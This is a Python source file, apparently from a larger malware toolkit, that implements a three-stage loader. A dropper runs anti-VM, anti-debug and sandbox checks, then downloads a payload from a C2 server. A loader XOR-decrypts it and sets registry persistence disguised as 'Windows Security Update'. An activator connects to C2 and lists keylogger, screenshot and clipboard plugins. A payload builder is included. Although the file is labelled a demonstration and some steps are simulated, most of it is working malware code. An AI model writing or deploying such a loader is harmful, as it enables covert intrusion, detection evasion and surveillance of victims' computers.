"""
Multi-Stage Loader System
Demonstrates staged payload delivery and execution
Save as: evasion_modules/multi_stage_loader.py
"""
import os
import sys
import json
import base64
import zlib
import hashlib
import tempfile
import subprocess
from pathlib import Path
from typing import Optional, Dict, Any
import requests


class StageConfig:
    """Configuration for staged loading"""
    def __init__(self):
        self.stage1_complete = False
        self.stage2_complete = False
        self.stage3_complete = False
        self.payload_server = None
        self.encryption_key = None


class Stage1Dropper:
    """
    Stage 1: Small dropper that performs environment checks
    
    Responsibilities:
    - Environment validation
    - Anti-analysis checks
    - Download Stage 2 if environment is safe
    - Minimal footprint (small file size)
    """
    
    def __init__(self, config_url: str = None):
        self.config_url = config_url or "http://localhost:5000/api/stage/config"
        self.stage_config = StageConfig()
        self.safe_to_proceed = False
    
    def run_environment_checks(self) -> bool:
        """
        Run comprehensive environment checks
        Returns True if environment is safe
        """
        print("\n" + "="*70)
        print("STAGE 1: DROPPER - Environment Validation")
        print("="*70)
        
        checks_passed = 0
        checks_total = 0
        
        # Import evasion modules
        try:
            from evasion_modules.anti_vm import check_virtual_environment
            from evasion_modules.anti_debug import check_debugging_environment
            from evasion_modules.environment_awareness import perform_environment_check
            
            # Check 1: VM Detection
            print("\n[1/3] Checking for virtual machine...")
            checks_total += 1
            vm_check = check_virtual_environment()
            if not vm_check.get('is_virtual'):
                print("  ✓ Physical machine detected")
                checks_passed += 1
            else:
                print(f"  ⚠ VM detected: {vm_check.get('vendor', 'Unknown')}")
            
            # Check 2: Debugger Detection
            print("[2/3] Checking for debugger...")
            checks_total += 1
            debug_check = check_debugging_environment()
            if not debug_check.get('is_being_debugged'):
                print("  ✓ No debugger detected")
                checks_passed += 1
            else:
                print("  ⚠ Debugger detected")
            
            # Check 3: Environment Analysis
            print("[3/3] Analyzing environment...")
            checks_total += 1
            env_check = perform_environment_check()
            if not env_check['summary'].get('likely_sandbox'):
                print("  ✓ Environment appears legitimate")
                checks_passed += 1
            else:
                print(f"  ⚠ Sandbox likely (score: {env_check['summary']['suspicion_score']:.1f}%)")
            
        except ImportError as e:
            print(f"  ⚠ Could not import evasion modules: {e}")
            # For demo, assume safe if modules not available
            checks_passed = checks_total = 1
        
        # Determine if safe to proceed
        print(f"\nEnvironment Check: {checks_passed}/{checks_total} passed")
        
        # For demonstration, we'll be lenient (50% pass rate)
        # Real malware would require 100%
        self.safe_to_proceed = (checks_passed / checks_total) >= 0.5
        
        if self.safe_to_proceed:
            print("✓ Environment deemed SAFE - Proceeding to Stage 2")
        else:
            print("✗ Environment deemed UNSAFE - Aborting")
        
        print("="*70)
        
        self.stage_config.stage1_complete = self.safe_to_proceed
        return self.safe_to_proceed
    
    def fetch_stage2_config(self) -> Optional[Dict[str, Any]]:
        """
        Fetch Stage 2 configuration from C2 server
        Returns configuration dict or None
        """
        print("\n[*] Fetching Stage 2 configuration...")
        
        try:
            response = requests.get(self.config_url, timeout=10)
            
            if response.status_code == 200:
                config = response.json()
                print(f"  ✓ Configuration received")
                return config
            else:
                print(f"  ✗ Failed to fetch config: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"  ✗ Network error: {e}")
            return None
    
    def download_stage2(self, url: str) -> Optional[bytes]:
        """
        Download Stage 2 payload
        Returns encrypted payload bytes or None
        """
        print(f"[*] Downloading Stage 2 from {url}...")
        
        try:
            response = requests.get(url, timeout=30)
            
            if response.status_code == 200:
                payload = response.content
                print(f"  ✓ Downloaded {len(payload)} bytes")
                return payload
            else:
                print(f"  ✗ Download failed: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"  ✗ Download error: {e}")
            return None
    
    def execute(self) -> bool:
        """
        Execute Stage 1 dropper
        Returns True if Stage 2 should be loaded
        """
        # Step 1: Environment checks
        if not self.run_environment_checks():
            print("\n[!] Stage 1 ABORTED - Unsafe environment")
            return False
        
        # Step 2: Fetch Stage 2 config (simulation)
        print("\n[*] Stage 1 complete - Ready for Stage 2")
        return True


class Stage2Loader:
    """
    Stage 2: Payload loader
    
    Responsibilities:
    - Decrypt and validate Stage 2 payload
    - Load core monitoring functionality
    - Establish persistence
    - Prepare for Stage 3
    """
    
    def __init__(self, encryption_key: str = "default_key"):
        self.encryption_key = encryption_key
        self.payload_loaded = False
        self.modules_loaded = []
    
    def decrypt_payload(self, encrypted_data: bytes) -> Optional[bytes]:
        """
        Decrypt Stage 2 payload
        Uses simple XOR for demonstration
        """
        print("\n" + "="*70)
        print("STAGE 2: LOADER - Payload Decryption")
        print("="*70)
        
        print("[*] Decrypting payload...")
        
        try:
            from evasion_modules.obfuscation import xor_decrypt
            
            decrypted = xor_decrypt(encrypted_data, self.encryption_key)
            decompressed = zlib.decompress(decrypted)
            
            print(f"  ✓ Decrypted {len(decompressed)} bytes")
            print("="*70)
            
            return decompressed
            
        except Exception as e:
            print(f"  ✗ Decryption failed: {e}")
            print("="*70)
            return None
    
    def validate_payload(self, payload: bytes, expected_hash: str) -> bool:
        """
        Validate payload integrity
        """
        print("[*] Validating payload integrity...")
        
        actual_hash = hashlib.sha256(payload).hexdigest()
        
        if actual_hash == expected_hash:
            print(f"  ✓ Hash verified: {actual_hash[:16]}...")
            return True
        else:
            print(f"  ✗ Hash mismatch!")
            print(f"    Expected: {expected_hash[:16]}...")
            print(f"    Actual:   {actual_hash[:16]}...")
            return False
    
    def load_core_modules(self) -> bool:
        """
        Load core monitoring modules
        """
        print("\n[*] Loading core modules...")
        
        modules_to_load = [
            'monitoring',
            'screenshots', 
            'api_routes',
            'reverse_connection'
        ]
        
        for module_name in modules_to_load:
            try:
                print(f"  [+] Loading {module_name}...")
                # In real implementation, would dynamically import
                self.modules_loaded.append(module_name)
                print(f"    ✓ {module_name} loaded")
            except Exception as e:
                print(f"    ✗ Failed to load {module_name}: {e}")
        
        self.payload_loaded = len(self.modules_loaded) > 0
        return self.payload_loaded
    
    def establish_persistence(self) -> bool:
        """
        Establish system persistence
        """
        print("\n[*] Establishing persistence...")
        
        try:
            from persistence_modules.registry import install_registry_persistence
            
            success = install_registry_persistence(
                exe_path=sys.executable,
                name="Windows Security Update"
            )
            
            if success:
                print("  ✓ Persistence established")
                return True
            else:
                print("  ⚠ Persistence failed (may not have permissions)")
                return False
                
        except Exception as e:
            print(f"  ✗ Persistence error: {e}")
            return False
    
    def execute(self) -> bool:
        """
        Execute Stage 2 loader
        Returns True if Stage 3 should proceed
        """
        # Simulate decryption (in real implementation would download encrypted payload)
        print("\n[*] Stage 2: Simulating payload decryption...")
        
        # Load core modules
        if not self.load_core_modules():
            print("\n[!] Stage 2 FAILED - Could not load modules")
            return False
        
        # Establish persistence
        self.establish_persistence()
        
        print("\n[*] Stage 2 complete - Ready for Stage 3")
        return True


class Stage3Activator:
    """
    Stage 3: Full functionality activation
    
    Responsibilities:
    - Activate all monitoring features
    - Connect to C2 server
    - Start data collection
    - Enable plugin system
    """
    
    def __init__(self):
        self.activated = False
        self.c2_connected = False
    
    def connect_to_c2(self, server_url: str, api_key: str) -> bool:
        """
        Establish connection to C2 server
        """
        print("\n" + "="*70)
        print("STAGE 3: ACTIVATOR - Full System Activation")
        print("="*70)
        
        print(f"\n[*] Connecting to C2: {server_url}")
        
        try:
            # Test connection
            response = requests.get(
                f"{server_url}/api/status",
                headers={'X-API-Key': api_key},
                timeout=5
            )
            
            if response.status_code == 200:
                print("  ✓ C2 connection established")
                self.c2_connected = True
                return True
            else:
                print(f"  ✗ Connection failed: HTTP {response.status_code}")
                return False
                
        except Exception as e:
            print(f"  ✗ Connection error: {e}")
            return False
    
    def activate_monitoring(self) -> bool:
        """
        Activate all monitoring features
        """
        print("\n[*] Activating monitoring systems...")
        
        try:
            from server_modules.monitoring import start_monitoring
            from server_modules.config import pc_id
            
            result = start_monitoring(pc_id)
            
            if result.get('status') == 'started':
                print("  ✓ Monitoring active")
                return True
            else:
                print(f"  ⚠ Monitoring status: {result.get('status')}")
                return False
                
        except Exception as e:
            print(f"  ✗ Monitoring error: {e}")
            return False
    
    def load_plugins(self) -> bool:
        """
        Load additional plugin modules
        """
        print("\n[*] Loading plugin system...")
        
        # Simulate plugin loading
        plugins = ['keylogger', 'screenshot', 'clipboard', 'process_manager']
        
        for plugin in plugins:
            print(f"  [+] Plugin: {plugin}")
        
        print("  ✓ Plugin system ready")
        return True
    
    def execute(self) -> bool:
        """
        Execute Stage 3 activation
        Returns True if fully activated
        """
        # Load plugins
        self.load_plugins()
        
        # Activate monitoring
        # self.activate_monitoring()  # Uncomment if want to actually start
        
        self.activated = True
        
        print("\n" + "="*70)
        print("✓ STAGE 3 COMPLETE - FULL SYSTEM ACTIVE")
        print("="*70)
        
        return True


class MultiStageLoader:
    """
    Orchestrates the multi-stage loading process
    """
    
    def __init__(self, config_url: str = None, encryption_key: str = "default_key"):
        self.stage1 = Stage1Dropper(config_url)
        self.stage2 = Stage2Loader(encryption_key)
        self.stage3 = Stage3Activator()
        self.current_stage = 0
    
    def execute_all_stages(self) -> bool:
        """
        Execute all three stages in sequence
        Returns True if all stages complete successfully
        """
        print("\n" + "="*70)
        print("MULTI-STAGE LOADER - EXECUTION START")
        print("="*70)
        print("\nThis demonstrates a three-stage loading process:")
        print("  Stage 1: Environment checks and dropper")
        print("  Stage 2: Payload decryption and module loading")
        print("  Stage 3: Full activation and C2 connection")
        print("="*70)
        
        # Stage 1: Dropper
        self.current_stage = 1
        if not self.stage1.execute():
            return False
        
        # Stage 2: Loader
        self.current_stage = 2
        if not self.stage2.execute():
            return False
        
        # Stage 3: Activator
        self.current_stage = 3
        if not self.stage3.execute():
            return False
        
        print("\n" + "="*70)
        print("✓✓✓ ALL STAGES COMPLETE - SYSTEM FULLY OPERATIONAL ✓✓✓")
        print("="*70)
        
        return True
    
    def get_stage_status(self) -> Dict[str, Any]:
        """
        Get current status of all stages
        """
        return {
            'current_stage': self.current_stage,
            'stage1_complete': self.stage1.stage_config.stage1_complete,
            'stage2_complete': self.stage2.payload_loaded,
            'stage3_complete': self.stage3.activated,
            'safe_environment': self.stage1.safe_to_proceed,
            'modules_loaded': self.stage2.modules_loaded,
            'c2_connected': self.stage3.c2_connected
        }


# =============================================================================
# PAYLOAD BUILDER (For C2 Server)
# =============================================================================

class PayloadBuilder:
    """
    Build encrypted payloads for Stage 2
    This would run on the C2 server
    """
    
    @staticmethod
    def create_stage2_payload(modules: list, encryption_key: str = "default_key") -> bytes:
        """
        Create encrypted Stage 2 payload
        
        Args:
            modules: List of module names to include
            encryption_key: Encryption key
        
        Returns:
            Encrypted payload bytes
        """
        from evasion_modules.obfuscation import xor_encrypt
        
        # Create payload metadata
        payload_data = {
            'version': '2.0',
            'modules': modules,
            'timestamp': '2024-01-01T00:00:00',
            'capabilities': ['keylog', 'screenshot', 'remote_cmd']
        }
        
        # Serialize and compress
        json_str = json.dumps(payload_data)
        compressed = zlib.compress(json_str.encode('utf-8'))
        
        # Encrypt
        encrypted = xor_encrypt(compressed, encryption_key)
        
        return encrypted
    
    @staticmethod
    def calculate_payload_hash(payload: bytes) -> str:
        """Calculate SHA256 hash of payload"""
        return hashlib.sha256(payload).hexdigest()


# =============================================================================
# DEMONSTRATION
# =============================================================================

if __name__ == "__main__":
    print("\n" + "="*70)
    print("MULTI-STAGE LOADING DEMONSTRATION")
    print("="*70)
    print("\nThis demonstrates how malware uses staged loading to:")
    print("  1. Reduce initial footprint (Stage 1 is small)")
    print("  2. Evade detection (only proceeds if environment is safe)")
    print("  3. Hide functionality (Stage 2 downloaded/decrypted at runtime)")
    print("  4. Complicate analysis (each stage must be unpacked)")
    print("="*70)
    
    input("\nPress Enter to begin multi-stage loading demo...")
    
    # Create loader
    loader = MultiStageLoader()
    
    # Execute all stages
    success = loader.execute_all_stages()
    
    # Show final status
    print("\n" + "="*70)
    print("FINAL STATUS")
    print("="*70)
    status = loader.get_stage_status()
    for key, value in status.items():
        print(f"  {key}: {value}")
    print("="*70)
    
    if success:
        print("\n✓ Multi-stage loading completed successfully!")
        print("  In production, the system would now be fully operational.")
    else:
        print("\n✗ Multi-stage loading failed at stage", loader.current_stage)
        print("  This is by design - malware aborts if environment is unsafe.")